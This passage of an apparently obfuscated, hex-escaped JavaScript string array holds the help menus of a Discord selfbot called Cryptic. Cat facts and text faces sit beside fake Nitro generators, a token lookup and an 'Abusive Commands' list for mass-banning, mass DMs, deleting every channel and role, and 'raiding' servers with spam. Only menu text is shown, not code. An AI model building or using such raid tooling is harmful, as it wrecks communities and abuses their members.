x20\x6F\x70\x74\x69\x6F\x6E\x61\x6C\x0D\x0A\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x67\x68\x6F\x73\x74\x70\x69\x6E\x67\x20\x3C\x63\x68\x61\x6E\x6E\x65\x6C\x2D\x69\x64\x3E\x20\x3C\x75\x73\x65\x72\x2D\x69\x64\x3E\x20\xBB\x20\x47\x68\x6F\x73\x74\x70\x69\x6E\x67\x73\x20\x74\x68\x65\x20\x75\x73\x65\x72\x20\x69\x6E\x20\x74\x68\x65\x20\x63\x68\x61\x6E\x6E\x65\x6C\x20\x5B\x47\x55\x49\x4C\x44\x20\x4F\x4E\x4C\x59\x5D\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x68\x61\x63\x6B\x20\x3C\x75\x73\x65\x72\x2D\x69\x64\x3E\x20\xBB\x20\x48\x61\x63\x6B\x73\x20\x74\x68\x65\x20\x75\x73\x65\x72\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x6E\x69\x74\x72\x6F\x20\xBB\x20\x47\x65\x6E\x65\x72\x61\x74\x65\x73\x20\x61\x20\x72\x61\x6E\x64\x6F\x6D\x20\x64\x69\x73\x63\x6F\x72\x64\x20\x6E\x69\x74\x72\x6F\x20\x63\x6F\x64\x65\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x66\x61\x6B\x65\x6E\x69\x74\x72\x6F\x20\x3C\x75\x73\x65\x72\x2D\x69\x64\x3E\x20\xBB\x20\x53\x65\x6E\x64\x73\x20\x74\x68\x65\x20\x75\x73\x65\x72\x20\x61\x20\x64\x69\x73\x63\x6F\x72\x20\x6E\x69\x74\x72\x6F\x20\x72\x69\x63\x6B\x20\x72\x6F\x6C\x6C","\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x5C\x60\x5C\x60\x5C\x60","\x69\x6E\x66\x6F","\x62\x6F\x74\x69\x6E\x66\x6F\x2A\x2A\x20\xBB\x20\x53\x68\x6F\x77\x73\x20\x69\x6E\x66\x6F\x72\x6D\x61\x74\x69\x6F\x6E\x20\x6F\x6E\x20\x74\x68\x65\x20\x43\x72\x79\x70\x74\x69\x63\x20\x73\x65\x6C\x66\x62\x6F\x74\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x63\x61\x74\x66\x61\x63\x74\x2A\x2A\x20\xBB\x20\x52\x61\x6E\x64\x6F\x6D\x20\x63\x61\x74\x20\x66\x61\x63\x74\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x64\x6F\x67\x66\x61\x63\x74\x2A\x2A\x20\xBB\x20\x52\x61\x6E\x64\x6F\x6D\x20\x64\x6F\x67\x20\x66\x61\x63\x74\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x66\x6F\x78\x66\x61\x63\x74\x2A\x2A\x20\xBB\x20\x52\x61\x6E\x64\x6F\x6D\x20\x66\x6F\x78\x20\x66\x61\x63\x74\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x68\x65\x6C\x70\x2A\x2A\x20\xBB\x20\x53\x68\x6F\x77\x73\x20\x61\x20\x6C\x69\x73\x74\x20\x6F\x66\x20\x63\x6F\x6D\x6D\x61\x6E\x64\x20\x63\x61\x74\x65\x67\x6F\x72\x69\x65\x73\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x73\x65\x72\x76\x65\x72\x69\x6E\x66\x6F\x2A\x2A\x20\xBB\x20\x53\x68\x6F\x77\x73\x20\x74\x68\x65\x20\x73\x65\x72\x76\x65\x72\x73\x20\x69\x6E\x66\x6F\x72\x6D\x61\x74\x69\x6F\x6E\x20\x5B\x47\x55\x49\x4C\x44\x20\x4F\x4E\x4C\x59\x5D\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x74\x6F\x6B\x65\x6E\x69\x6E\x66\x6F\x20\x3C\x74\x6F\x6B\x65\x6E\x3E\x2A\x2A\x20\xBB\x20\x47\x65\x74\x73\x20\x69\x6E\x66\x6F\x72\x6D\x61\x74\x69\x6F\x6E\x20\x6F\x6E\x20\x74\x68\x61\x74\x20\x74\x6F\x6B\x65\x6E\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x77\x68\x6F\x69\x73\x20\x5B\x75\x73\x65\x72\x5D\x2A\x2A\x20\xBB\x20\x53\x68\x6F\x77\x73\x20\x69\x6E\x66\x6F\x72\x6D\x61\x74\x69\x6F\x6E\x20\x6F\x6E\x20\x74\x68\x65\x20\x6D\x65\x6E\x74\x69\x6F\x6E\x65\x64\x20\x75\x73\x65\x72\x20\x5B\x47\x55\x49\x4C\x44\x20\x4F\x4E\x4C\x59\x5D\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x49\x6E\x66\x6F\x20\x43\x6F\x6D\x6D\x61\x6E\x64\x73","\x5C\x60\x5C\x60\x5C\x60\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x49\x6E\x66\x6F\x20\x43\x6F\x6D\x6D\x61\x6E\x64\x73\x0D\x0A\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x3C\x3E\x20\x3D\x20\x72\x65\x71\x75\x69\x72\x65\x64\x20\x7C\x20\x5B\x5D\x20\x3D\x20\x6F\x70\x74\x69\x6F\x6E\x61\x6C\x0D\x0A\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x62\x6F\x74\x69\x6E\x66\x6F\x20\xBB\x20\x53\x68\x6F\x77\x73\x20\x69\x6E\x66\x6F\x72\x6D\x61\x74\x69\x6F\x6E\x20\x6F\x6E\x20\x74\x68\x65\x20\x43\x72\x79\x70\x74\x69\x63\x20\x73\x65\x6C\x66\x62\x6F\x74\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x63\x61\x74\x66\x61\x63\x74\x20\xBB\x20\x52\x61\x6E\x64\x6F\x6D\x20\x63\x61\x74\x20\x66\x61\x63\x74\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x64\x6F\x67\x66\x61\x63\x74\x20\xBB\x20\x52\x61\x6E\x64\x6F\x6D\x20\x64\x6F\x67\x20\x66\x61\x63\x74\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x66\x6F\x78\x66\x61\x63\x74\x20\xBB\x20\x52\x61\x6E\x64\x6F\x6D\x20\x66\x6F\x78\x20\x66\x61\x63\x74\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x68\x65\x6C\x70\x20\xBB\x20\x53\x68\x6F\x77\x73\x20\x61\x20\x6C\x69\x73\x74\x20\x6F\x66\x20\x63\x6F\x6D\x6D\x61\x6E\x64\x20\x63\x61\x74\x65\x67\x6F\x72\x69\x65\x73\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x73\x65\x72\x76\x65\x72\x69\x6E\x66\x6F\x20\xBB\x20\x53\x68\x6F\x77\x73\x20\x74\x68\x65\x20\x73\x65\x72\x76\x65\x72\x73\x20\x69\x6E\x66\x6F\x72\x6D\x61\x74\x69\x6F\x6E\x20\x5B\x47\x55\x49\x4C\x44\x20\x4F\x4E\x4C\x59\x5D\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x74\x6F\x6B\x65\x6E\x69\x6E\x66\x6F\x20\x3C\x74\x6F\x6B\x65\x6E\x3E\x20\xBB\x20\x47\x65\x74\x73\x20\x69\x6E\x66\x6F\x72\x6D\x61\x74\x69\x6F\x6E\x20\x6F\x6E\x20\x74\x68\x61\x74\x20\x74\x6F\x6B\x65\x6E\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x77\x68\x6F\x69\x73\x20\x5B\x75\x73\x65\x72\x5D\x20\xBB\x20\x53\x68\x6F\x77\x73\x20\x69\x6E\x66\x6F\x72\x6D\x61\x74\x69\x6F\x6E\x20\x6F\x6E\x20\x74\x68\x65\x20\x6D\x65\x6E\x74\x69\x6F\x6E\x65\x64\x20\x75\x73\x65\x72\x20\x5B\x47\x55\x49\x4C\x44\x20\x4F\x4E\x4C\x59\x5D","\x66\x61\x63\x65","\x6C\x65\x6E\x6E\x79\x2A\x2A\x20\xBB\x20\x53\x65\x6E\x64\x73\x20\x28\x20\u0361\xB0\x20\u035C\u0296\x20\u0361\xB0\x29\x20\x69\x6E\x74\x6F\x20\x74\x68\x65\x20\x63\x75\x72\x72\x65\x6E\x74\x20\x63\x68\x61\x6E\x6E\x65\x6C\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x66\x6C\x69\x70\x2A\x2A\x20\xBB\x20\x53\x65\x6E\x64\x73\x20\x28\u256F\xB0\u25A1\xB0\uFF09\u256F\uFE35\x20\u253B\u2501\u253B\x20\x69\x6E\x74\x6F\x20\x74\x68\x65\x20\x63\x75\x72\x72\x65\x6E\x74\x20\x63\x68\x61\x6E\x6E\x65\x6C\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x75\x6E\x66\x6C\x69\x70\x2A\x2A\x20\xBB\x20\x53\x65\x6E\x64\x73\x20\u252C\u2500\u252C\x20\u30CE\x28\x20\u309C\x2D\u309C\u30CE\x29\x20\x69\x6E\x74\x6F\x20\x74\x68\x65\x20\x63\x75\x72\x72\x65\x6E\x74\x20\x63\x68\x61\x6E\x6E\x65\x6C\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x73\x68\x72\x75\x67\x2A\x2A\x20\xBB\x20\x53\x65\x6E\x64\x73\x20\xAF\x5C\x5C\x5F\x28\u30C4\x29\x5F\x2F\xAF\x20\x69\x6E\x74\x6F\x20\x74\x68\x65\x20\x63\x75\x72\x72\x65\x6E\x74\x20\x63\x68\x61\x6E\x6E\x65\x6C\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x46\x61\x63\x65\x20\x43\x6F\x6D\x6D\x61\x6E\x64\x73","\x5C\x60\x5C\x60\x5C\x60\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x46\x61\x63\x65\x20\x43\x6F\x6D\x6D\x61\x6E\x64\x73\x0D\x0A\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x3C\x3E\x20\x3D\x20\x72\x65\x71\x75\x69\x72\x65\x64\x20\x7C\x20\x5B\x5D\x20\x3D\x20\x6F\x70\x74\x69\x6F\x6E\x61\x6C\x0D\x0A\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x6C\x65\x6E\x6E\x79\x20\xBB\x20\x53\x65\x6E\x64\x73\x20\x28\x20\u0361\xB0\x20\u035C\u0296\x20\u0361\xB0\x29\x20\x69\x6E\x74\x6F\x20\x74\x68\x65\x20\x63\x75\x72\x72\x65\x6E\x74\x20\x63\x68\x61\x6E\x6E\x65\x6C\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x66\x6C\x69\x70\x20\xBB\x20\x53\x65\x6E\x64\x73\x20\x28\u256F\xB0\u25A1\xB0\uFF09\u256F\uFE35\x20\u253B\u2501\u253B\x20\x69\x6E\x74\x6F\x20\x74\x68\x65\x20\x63\x75\x72\x72\x65\x6E\x74\x20\x63\x68\x61\x6E\x6E\x65\x6C\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x75\x6E\x66\x6C\x69\x70\x20\xBB\x20\x53\x65\x6E\x64\x73\x20\u252C\u2500\u252C\x20\u30CE\x28\x20\u309C\x2D\u309C\u30CE\x29\x20\x69\x6E\x74\x6F\x20\x74\x68\x65\x20\x63\x75\x72\x72\x65\x6E\x74\x20\x63\x68\x61\x6E\x6E\x65\x6C\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x73\x68\x72\x75\x67\x20\xBB\x20\x53\x65\x6E\x64\x73\x20\xAF\x5C\x5C\x5F\x28\u30C4\x29\x5F\x2F\xAF\x20\x69\x6E\x74\x6F\x20\x74\x68\x65\x20\x63\x75\x72\x72\x65\x6E\x74\x20\x63\x68\x61\x6E\x6E\x65\x6C","\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x3C\x3E\x20\x3D\x20\x72\x65\x71\x75\x69\x72\x65\x64\x20\x7C\x20\x5B\x5D\x20\x3D\x20\x6F\x70\x74\x69\x6F\x6E\x61\x6C\x0D\x0A\x20\x20\x20\x20\x20\x20\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x6C\x69\x73\x74\x65\x6E\x69\x6E\x67\x20\x3C\x6D\x65\x73\x73\x61\x67\x65\x3E\x2A\x2A\x20\xBB\x20\x53\x65\x74\x73\x20\x79\x6F\x75\x72\x20\x61\x63\x74\x69\x76\x69\x74\x79\x20\x61\x73\x20\x6C\x69\x73\x74\x65\x6E\x69\x6E\x67\x20\x77\x69\x74\x68\x20\x79\x6F\x75\x72\x20\x6D\x65\x73\x73\x61\x67\x65\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x70\x6C\x61\x79\x69\x6E\x67\x20\x3C\x6D\x65\x73\x73\x61\x67\x65\x3E\x2A\x2A\x20\xBB\x20\x53\x65\x74\x73\x20\x79\x6F\x75\x72\x20\x61\x63\x74\x69\x76\x69\x74\x79\x20\x61\x73\x20\x70\x6C\x61\x79\x69\x6E\x67\x20\x77\x69\x74\x68\x20\x79\x6F\x75\x72\x20\x6D\x65\x73\x73\x61\x67\x65\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x73\x74\x72\x65\x61\x6D\x20\x3C\x6D\x65\x73\x73\x61\x67\x65\x3E\x2A\x2A\x20\xBB\x20\x53\x65\x74\x73\x20\x79\x6F\x75\x72\x20\x61\x63\x74\x69\x76\x69\x74\x79\x20\x61\x73\x20\x73\x74\x72\x65\x61\x6D\x69\x6E\x67\x20\x77\x69\x74\x68\x20\x79\x6F\x75\x72\x20\x6D\x65\x73\x73\x61\x67\x65\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x77\x61\x74\x63\x68\x69\x6E\x67\x20\x3C\x6D\x65\x73\x73\x61\x67\x65\x3E\x2A\x2A\x20\xBB\x20\x53\x65\x74\x73\x20\x79\x6F\x75\x72\x20\x61\x63\x74\x69\x76\x69\x74\x79\x20\x61\x73\x20\x77\x61\x74\x63\x68\x69\x6E\x67\x20\x77\x69\x74\x68\x20\x79\x6F\x75\x72\x20\x6D\x65\x73\x73\x61\x67\x65\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x72\x65\x73\x65\x74\x2A\x2A\x20\xBB\x20\x52\x65\x73\x65\x74\x73\x20\x79\x6F\x75\x72\x20\x63\x75\x72\x72\x65\x6E\x74\x20\x61\x63\x74\x69\x76\x69\x74\x79\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x53\x74\x61\x74\x75\x73\x20\x43\x6F\x6D\x6D\x61\x6E\x64\x73","\x5C\x60\x5C\x60\x5C\x60\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x53\x74\x61\x74\x75\x73\x20\x43\x6F\x6D\x6D\x61\x6E\x64\x73\x0D\x0A\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x3C\x3E\x20\x3D\x20\x72\x65\x71\x75\x69\x72\x65\x64\x20\x7C\x20\x5B\x5D\x20\x3D\x20\x6F\x70\x74\x69\x6F\x6E\x61\x6C\x0D\x0A\x20\x20\x20\x20\x20\x20\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x6C\x69\x73\x74\x65\x6E\x69\x6E\x67\x20\x3C\x6D\x65\x73\x73\x61\x67\x65\x3E\x20\xBB\x20\x53\x65\x74\x73\x20\x79\x6F\x75\x72\x20\x61\x63\x74\x69\x76\x69\x74\x79\x20\x61\x73\x20\x6C\x69\x73\x74\x65\x6E\x69\x6E\x67\x20\x77\x69\x74\x68\x20\x79\x6F\x75\x72\x20\x6D\x65\x73\x73\x61\x67\x65\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x70\x6C\x61\x79\x69\x6E\x67\x20\x3C\x6D\x65\x73\x73\x61\x67\x65\x3E\x20\xBB\x20\x53\x65\x74\x73\x20\x79\x6F\x75\x72\x20\x61\x63\x74\x69\x76\x69\x74\x79\x20\x61\x73\x20\x70\x6C\x61\x79\x69\x6E\x67\x20\x77\x69\x74\x68\x20\x79\x6F\x75\x72\x20\x6D\x65\x73\x73\x61\x67\x65\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x73\x74\x72\x65\x61\x6D\x20\x3C\x6D\x65\x73\x73\x61\x67\x65\x3E\x20\xBB\x20\x53\x65\x74\x73\x20\x79\x6F\x75\x72\x20\x61\x63\x74\x69\x76\x69\x74\x79\x20\x61\x73\x20\x73\x74\x72\x65\x61\x6D\x69\x6E\x67\x20\x77\x69\x74\x68\x20\x79\x6F\x75\x72\x20\x6D\x65\x73\x73\x61\x67\x65\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x77\x61\x74\x63\x68\x69\x6E\x67\x20\x3C\x6D\x65\x73\x73\x61\x67\x65\x3E\x20\xBB\x20\x53\x65\x74\x73\x20\x79\x6F\x75\x72\x20\x61\x63\x74\x69\x76\x69\x74\x79\x20\x61\x73\x20\x77\x61\x74\x63\x68\x69\x6E\x67\x20\x77\x69\x74\x68\x20\x79\x6F\x75\x72\x20\x6D\x65\x73\x73\x61\x67\x65\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x72\x65\x73\x65\x74\x20\xBB\x20\x52\x65\x73\x65\x74\x73\x20\x79\x6F\x75\x72\x20\x63\x75\x72\x72\x65\x6E\x74\x20\x61\x63\x74\x69\x76\x69\x74\x79","\x61\x6E\x69\x6D\x61\x6C\x73","\x63\x61\x74\x2A\x2A\x20\xBB\x20\x52\x61\x6E\x64\x6F\x6D\x20\x63\x61\x74\x20\x69\x6D\x61\x67\x65\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x64\x6F\x67\x2A\x2A\x20\xBB\x20\x52\x61\x6E\x64\x6F\x6D\x20\x64\x6F\x67\x20\x69\x6D\x61\x67\x65\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x66\x6F\x78\x2A\x2A\x20\xBB\x20\x52\x61\x6E\x64\x6F\x6D\x20\x66\x6F\x78\x20\x69\x6D\x61\x67\x65\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x41\x6E\x69\x6D\x61\x6C\x20\x43\x6F\x6D\x6D\x61\x6E\x64\x73","\x5C\x60\x5C\x60\x5C\x60\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x41\x6E\x69\x6D\x61\x6C\x20\x43\x6F\x6D\x6D\x61\x6E\x64\x73\x0D\x0A\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x3C\x3E\x20\x3D\x20\x72\x65\x71\x75\x69\x72\x65\x64\x20\x7C\x20\x5B\x5D\x20\x3D\x20\x6F\x70\x74\x69\x6F\x6E\x61\x6C\x0D\x0A\x20\x20\x20\x20\x20\x20\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x63\x61\x74\x20\xBB\x20\x52\x61\x6E\x64\x6F\x6D\x20\x63\x61\x74\x20\x69\x6D\x61\x67\x65\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x64\x6F\x67\x20\xBB\x20\x52\x61\x6E\x64\x6F\x6D\x20\x64\x6F\x67\x20\x69\x6D\x61\x67\x65\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x66\x6F\x78\x20\xBB\x20\x52\x61\x6E\x64\x6F\x6D\x20\x66\x6F\x78\x20\x69\x6D\x61\x67\x65","\x61\x62\x75\x73\x65","\x64\x6D\x61\x6C\x6C\x2A\x2A\x20\xBB\x20\x53\x65\x6E\x64\x73\x20\x6D\x6F\x73\x74\x6C\x79\x20\x65\x76\x65\x72\x79\x6F\x6E\x65\x20\x69\x6E\x20\x74\x68\x65\x20\x73\x65\x72\x76\x65\x72\x20\x61\x20\x6D\x65\x73\x73\x61\x67\x65\x20\x6F\x66\x20\x79\x6F\x75\x72\x20\x63\x68\x6F\x69\x63\x65\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x64\x65\x6C\x63\x68\x61\x6E\x6E\x65\x6C\x73\x2A\x2A\x20\xBB\x20\x44\x65\x6C\x65\x74\x65\x73\x20\x65\x76\x65\x72\x79\x2D\x73\x69\x6E\x67\x6C\x65\x20\x63\x68\x61\x6E\x6E\x65\x6C\x20\x69\x6E\x20\x74\x68\x65\x20\x73\x65\x72\x76\x65\x72\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x64\x65\x6C\x72\x6F\x6C\x65\x73\x2A\x2A\x20\xBB\x20\x44\x65\x6C\x65\x74\x65\x73\x20\x65\x76\x65\x72\x79\x2D\x73\x69\x6E\x67\x6C\x65\x20\x72\x6F\x6C\x65\x20\x69\x6E\x20\x74\x68\x65\x20\x73\x65\x72\x76\x65\x72\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x6D\x61\x73\x73\x63\x68\x61\x6E\x6E\x65\x6C\x73\x2A\x2A\x20\xBB\x20\x43\x72\x65\x61\x74\x65\x73\x20\x61\x20\x77\x68\x6F\x6C\x65\x20\x62\x75\x6E\x63\x68\x20\x6F\x66\x20\x72\x61\x6E\x64\x6F\x6D\x20\x63\x68\x61\x6E\x6E\x65\x6C\x73\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x6D\x61\x73\x73\x72\x6F\x6C\x65\x73\x2A\x2A\x20\xBB\x20\x43\x72\x65\x61\x74\x65\x73\x20\x61\x20\x77\x68\x6F\x6C\x65\x20\x62\x75\x6E\x63\x68\x20\x6F\x66\x20\x72\x61\x6E\x64\x6F\x6D\x20\x72\x6F\x6C\x65\x73\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x6D\x61\x73\x73\x62\x61\x6E\x2A\x2A\x20\xBB\x20\x42\x61\x6E\x73\x20\x65\x76\x65\x72\x79\x6F\x6E\x65\x20\x69\x6E\x20\x74\x68\x65\x20\x73\x65\x72\x76\x65\x72\x20\x28\x4E\x6F\x74\x20\x69\x6E\x63\x6C\x75\x64\x69\x6E\x67\x20\x74\x68\x65\x20\x73\x65\x72\x76\x65\x72\x20\x6F\x77\x6E\x65\x72\x20\x6F\x72\x20\x6D\x65\x6D\x62\x65\x72\x73\x20\x77\x69\x74\x68\x20\x61\x20\x68\x69\x67\x68\x65\x72\x20\x72\x61\x6E\x6B\x2F\x72\x6F\x6C\x65\x29\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x6D\x61\x73\x73\x6B\x69\x63\x6B\x2A\x2A\x20\xBB\x20\x4B\x69\x63\x6B\x73\x20\x65\x76\x65\x72\x79\x6F\x6E\x65\x20\x69\x6E\x20\x74\x68\x65\x20\x73\x65\x72\x76\x65\x72\x20\x28\x4E\x6F\x74\x20\x69\x6E\x63\x6C\x75\x64\x69\x6E\x67\x20\x74\x68\x65\x20\x73\x65\x72\x76\x65\x72\x20\x6F\x77\x6E\x65\x72\x20\x6F\x72\x20\x6D\x65\x6D\x62\x65\x72\x73\x20\x77\x69\x74\x68\x20\x61\x20\x68\x69\x67\x68\x65\x72\x20\x72\x61\x6E\x6B\x2F\x72\x6F\x6C\x65\x29\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x6E\x69\x74\x72\x6F\x67\x65\x6E\x20\x3C\x61\x6D\x6F\x75\x6E\x74\x3E\x2A\x2A\x20\xBB\x20\x47\x65\x6E\x65\x72\x61\x74\x65\x73\x20\x74\x68\x65\x20\x61\x6D\x6F\x75\x6E\x74\x20\x6F\x66\x20\x64\x69\x73\x63\x6F\x72\x64\x20\x6E\x69\x74\x72\x6F\x20\x63\x6F\x64\x65\x73\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x6F\x72\x69\x67\x69\x6E\x61\x6C\x2A\x2A\x20\xBB\x20\x52\x65\x73\x65\x74\x73\x20\x74\x68\x65\x20\x65\x6E\x74\x69\x72\x65\x20\x73\x65\x72\x76\x65\x72\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x72\x61\x69\x64\x2A\x2A\x20\xBB\x20\x43\x68\x61\x6E\x67\x65\x73\x20\x74\x68\x65\x20\x73\x65\x72\x76\x65\x72\x20\x6E\x61\x6D\x65\x2C\x20\x69\x63\x6F\x6E\x2C\x20\x63\x72\x65\x61\x74\x65\x73\x20\x31\x30\x30\x20\x72\x6F\x6C\x65\x73\x20\x61\x6E\x64\x20\x6D\x61\x6B\x65\x73\x20\x31\x30\x30\x20\x74\x65\x78\x74\x20\x61\x6E\x64\x20\x76\x6F\x69\x63\x65\x20\x63\x68\x61\x6E\x6E\x65\x6C\x73\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x73\x70\x61\x6D\x61\x6C\x6C\x20\x3C\x6D\x65\x73\x73\x61\x67\x65\x3E\x2A\x2A\x20\xBB\x20\x53\x65\x6E\x64\x73\x20\x65\x76\x65\x72\x79\x20\x63\x68\x61\x6E\x6E\x65\x6C\x20\x61\x20\x6D\x65\x73\x73\x61\x67\x65\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x73\x70\x61\x6D\x20\x3C\x61\x6D\x6F\x75\x6E\x74\x3E\x20\x3C\x6D\x65\x73\x73\x61\x67\x65\x3E\x2A\x2A\x20\xBB\x20\x53\x70\x61\x6D\x73\x20\x79\x6F\x75\x72\x20\x6D\x65\x73\x73\x61\x67\x65\x20\x74\x68\x65\x20\x73\x70\x65\x63\x69\x66\x69\x65\x64\x20\x61\x6D\x6F\x75\x6E\x74\x20\x6F\x66\x20\x74\x69\x6D\x65\x73\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x77\x65\x62\x68\x6F\x6F\x6B\x73\x70\x61\x6D\x20\x3C\x77\x65\x62\x68\x6F\x6F\x6B\x2D\x75\x72\x6C\x3E\x20\x3C\x74\x72\x75\x65\x7C\x66\x61\x6C\x73\x65\x3E\x20\x3C\x6D\x65\x73\x73\x61\x67\x65\x3E\x2A\x2A\x20\xBB\x20\x53\x70\x61\x6D\x73\x20\x74\x68\x65\x20\x77\x65\x62\x68\x6F\x6F\x6B\x20\x31\x30\x30\x20\x74\x69\x6D\x65\x73\x20\x77\x69\x74\x68\x20\x79\x6F\x75\x72\x20\x6D\x65\x73\x73\x61\x67\x65\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x28\x74\x72\x75\x65\x20\x3D\x20\x6D\x65\x6E\x74\x69\x6F\x6E\x20\x65\x76\x65\x72\x79\x6F\x6E\x65\x20\x77\x69\x74\x68\x20\x79\x6F\x75\x72\x20\x6D\x65\x73\x73\x61\x67\x65\x2C\x20\x66\x61\x6C\x73\x65\x20\x3D\x20\x72\x65\x67\x75\x6C\x61\x72\x20\x6D\x65\x73\x73\x61\x67\x65\x20\x77\x69\x74\x68\x6F\x75\x74\x20\x6D\x65\x6E\x74\x69\x6F\x6E\x29","\x41\x62\x75\x73\x69\x76\x65\x20\x43\x6F\x6D\x6D\x61\x6E\x64\x73\x20\x5B\x47\x55\x49\x4C\x44\x20\x4F\x4E\x4C\x59\x5D","\x5C\x60\x5C\x60\x5C\x60\x0D\x0A\x41\x62\x75\x73\x69\x76\x65\x20\x43\x6F\x6D\x6D\x61\x6E\x64\x73\x20\x5B\x47\x55\x49\x4C\x44\x20\x4F\x4E\x4C\x59\x5D\x0D\x0A\x0D\x0A\x3C\x3E\x20\x3D\x20\x72\x65\x71\x75\x69\x72\x65\x64\x20\x7C\x20\x5B\x5D\x20\x3D\x20\x6F\x70\x74\x69\x6F\x6E\x61\x6C\x0D\x0A\x20\x20\x20\x20\x20\x20\x0D\x0A","\x64\x6D\x61\x6C\x6C\x20\xBB\x20\x53\x65\x6E\x64\x73\x20\x6D\x6F\x73\x74\x6C\x79\x20\x65\x76\x65\x72\x79\x6F\x6E\x65\x20\x69\x6E\x20\x74\x68\x65\x20\x73\x65\x72\x76\x65\x72\x20\x61\x20\x6D\x65\x73\x73\x61\x67\x65\x20\x6F\x66\x20\x79\x6F\x75\x72\x20\x63\x68\